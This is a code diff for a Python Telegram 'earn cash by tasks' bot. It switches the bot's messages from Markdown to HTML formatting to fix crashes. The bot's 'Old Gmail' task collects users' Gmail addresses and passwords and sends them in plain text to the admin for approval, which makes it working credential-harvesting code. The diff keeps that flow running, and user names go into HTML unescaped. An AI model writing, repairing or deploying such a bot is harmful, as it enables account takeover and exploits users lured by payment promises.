@@ -81,17 +81,17 @@ def send_welcome(message):
     
     get_balance(user_id) 
     
-    # If new user, notify Admin
+    # If new user, notify Admin (HTML formatting used to avoid name bugs)
     if is_new and user_id != ADMIN_ID:
         try:
-            bot.send_message(ADMIN_ID, f"🚀 *New User Started Bot!*\n\n👤 *User ID:* `{user_id}`\n👤 *Name:* {message.from_user.first_name}", parse_mode="Markdown")
+            bot.send_message(ADMIN_ID, f"🚀 <b>New User Started Bot!</b>\n\n👤 <b>User ID:</b> <code>{user_id}</code>\n👤 <b>Name:</b> {message.from_user.first_name}", parse_mode="HTML")
         except:
             pass
 
-    msg = (f"✨ *WELCOME TO OUR BOT!* ✨\n\n"
+    msg = (f"✨ <b>WELCOME TO OUR BOT!</b> ✨\n\n"
            f"Hello {message.from_user.first_name}, yahan aap simple tasks complete karke real cash earn kar sakte hain! 💸\n\n"
-           f"👇 *Niche diye gaye buttons se apna task shuru karein:*")
-    bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
+           f"👇 <b>Niche diye gaye buttons se apna task shuru karein:</b>")
+    bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=main_menu(user_id))
 
 # --- BUTTON CLICKS HANDLER ---
 @bot.message_handler(func=lambda message: True)
@@ -139,11 +139,12 @@ def handle_text(message):
         bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
 
     elif text == "📞 Contact & Help":
-        msg = ("📞 *CONTACT & SUPPORT*\n\n"
+        # Fixed the bug here by using HTML parse mode instead of Markdown
+        msg = ("📞 <b>CONTACT & SUPPORT</b>\n\n"
                "Agar aapko koi problem aa rahi hai ya payment se related koi sawal hai, toh humare Admin se direct baat karein:\n\n"
-               f"👨‍💻 *Admin ID:* @{ADMIN_USERNAME}\n"
-               "💬 _Click on the username to send a message._")
-        bot.send_message(user_id, msg, parse_mode="Markdown", reply_markup=main_menu(user_id))
+               f"👨‍💻 <b>Admin ID:</b> @{ADMIN_USERNAME}\n"
+               "💬 <i>Click on the username to send a message.</i>")
+        bot.send_message(user_id, msg, parse_mode="HTML", reply_markup=main_menu(user_id))
 
     elif text == "💸 Withdraw":
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
@@ -210,7 +211,8 @@ def handle_text(message):
             
             markup = InlineKeyboardMarkup()
             markup.add(InlineKeyboardButton("🔙 Back to Main", callback_data="back_to_main"))
-            bot.send_message(user_id, f"✅ Email saved: `{gmail_email}`\n\n👉 Ab iska *Password* bhejein:", parse_mode="Markdown", reply_markup=markup)
+            # Using HTML to prevent crashes from email underscores
+            bot.send_message(user_id, f"✅ Email saved: <code>{gmail_email}</code>\n\n👉 Ab iska <b>Password</b> bhejein:", parse_mode="HTML", reply_markup=markup)
 
         # Old Gmail Task - Step 2: Password received, submit to Admin
         elif state_data['state'] == 'old_gmail_password':
@@ -223,11 +225,12 @@ def handle_text(message):
             markup.row(InlineKeyboardButton("✅ Approve", callback_data=f"oldappr_{user_id}"),
                        InlineKeyboardButton("❌ Reject", callback_data=f"oldrej_{user_id}"))
             
-            admin_msg = (f"🔔 *NEW OLD GMAIL SUBMISSION*\n\n"
-                         f"👤 *User ID:* `{user_id}`\n"
-                         f"📧 *Gmail:* `{gmail_email}`\n"
-                         f"🔑 *Password:* `{gmail_pass}`")
-            bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=markup)
+            # Using HTML to prevent crashes from password or email underscores
+            admin_msg = (f"🔔 <b>NEW OLD GMAIL SUBMISSION</b>\n\n"
+                         f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
+                         f"📧 <b>Gmail:</b> <code>{gmail_email}</code>\n"
+                         f"🔑 <b>Password:</b> <code>{gmail_pass}</code>")
+            bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
             del user_states[user_id]
 
         # Withdraw Amount
@@ -285,12 +288,13 @@ def handle_text(message):
                        InlineKeyboardButton("❌ Reject", callback_data=f"rejcc_{pending_id}"))
             
             curr_symbol = "₹" if method == "🏦 UPI" else "$"
-            admin_msg = (f"🔔 *NEW WITHDRAW REQUEST*\n\n"
-                         f"👤 *User ID:* `{user_id}`\n"
-                         f"🏦 *Method:* {method}\n"
-                         f"💰 *Amount:* {curr_symbol}{display_amount}\n"
-                         f"📌 *Address:* `{address}`")
-            bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=markup)
+            # HTML parsing ensures no crashes if address contains an underscore
+            admin_msg = (f"🔔 <b>NEW WITHDRAW REQUEST</b>\n\n"
+                         f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
+                         f"🏦 <b>Method:</b> {method}\n"
+                         f"💰 <b>Amount:</b> {curr_symbol}{display_amount}\n"
+                         f"📌 <b>Address:</b> <code>{address}</code>")
+            bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=markup)
             del user_states[user_id]
 
         # Admin - Add Balance (Step 1: Enter ID)
@@ -456,5 +460,5 @@ def handle_photo(message):
         handle_all_media(message)
 
 # --- START BOT ---
-print("Bot is fully updated, bug-free, and running...")
+print("Bot is running with HTML parsing for error-free execution...")
 bot.polling(none_stop=True)
